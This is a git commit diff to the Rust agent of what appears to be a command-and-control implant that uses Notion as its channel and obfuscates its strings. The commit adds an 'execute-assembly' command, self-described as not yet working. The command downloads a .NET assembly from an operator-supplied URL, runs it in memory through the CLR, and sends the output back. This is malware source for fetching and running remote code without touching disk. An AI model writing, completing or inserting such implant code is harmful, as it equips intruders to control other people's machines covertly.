613a9e91236d84f641d40d176ed8b3ed6c97df99
Michael Taggart <mtaggart@taggart-tech.com>
2023-03-29 20:07:51 -0700

    Started, but not working, exec-assembly

--- agent/src/cmd/execute_assembly.rs
+++ agent/src/cmd/execute_assembly.rs
@@ -2,32 +2,59 @@ use std::error::Error;
 use litcrypt::lc;
 use crate::cmd::{CommandArgs, notion_out};
 use crate::logger::{Logger, log_out};
+use clroxide::{
+    clr::{Clr, ClrContext},
+    primitives::{
+        ICLRMetaHost,
+        GUID,
+        HRESULT
+    }
+};
+use std::ffi::c_void;
+use std::mem::transmute;
+use reqwest::{get, StatusCode};
 
-use std::fs;
-use std::path::{Path, PathBuf};
-
+///
+/// Executes .NET assembly in memory given a URL to the assembly and a set of arguments
+/// 
 pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger)-> Result<String, Box<dyn Error>> {
     
-    let file_vector: Vec<String> = std::fs::read_dir(".").unwrap() 
-        .filter_map(|maybe_dir_entry| {
-            let dir_entry = maybe_dir_entry.ok()?;
-            let path_buf = dir_entry.path();
-            let file_name = path_buf.file_name()?;
-            let string = file_name.to_str()?; 
-            Some(string.to_string())
-        })
-        .collect();
+    // Parse args
+    // Check URL
+    if let Some(url) = cmd_args.nth(0) {
+        logger.debug(log_out!("Fetching Assembly at ", &url));
+        // Fetch Assembly
+        match get(&url).await {            
+            Ok(r) => {
+                if r.status() == StatusCode::OK {
+                    logger.debug(log_out!("Assembly retrieved"));
+                    if let Ok(assembly) = r.bytes().await {
+                        let assembly_args: Vec<String> = cmd_args.collect();
+                        // Instantiate CLR
 
-        let mut return_string: String = "".to_string();
-
-        for file_name in file_vector {
-            return_string.push_str(&file_name);
-            return_string.push_str("\n");
+                        if let Ok(mut clr) = Clr::new(assembly.to_vec(), assembly_args) {
+                            // Get clr context
+                            // Run Assembly
+                            // Return Output
+                            logger.debug(log_out!("CLR Created"));
+                            let res: String = clr.run().unwrap();
+                            dbg!("{:?}", res);
+                            return notion_out!(res);
+                        }
+                    }
+                } else {
+                    let status_code = r.status();
+                    return notion_out!("Could not download: HTTP ", status_code.as_str());
+                }
+            },
+            Err(_) => {
+                return notion_out!("Could not request", &url);
+            }
         }
 
-        if return_string.is_empty() {
-            Ok(lc!("[*] Directory is empty"))
-        } else {
-            Ok(return_string)
-        }
+    } else {
+        return notion_out!("No URL provided!")
+    }
+
+    notion_out!("Assembly Executed!")
 }
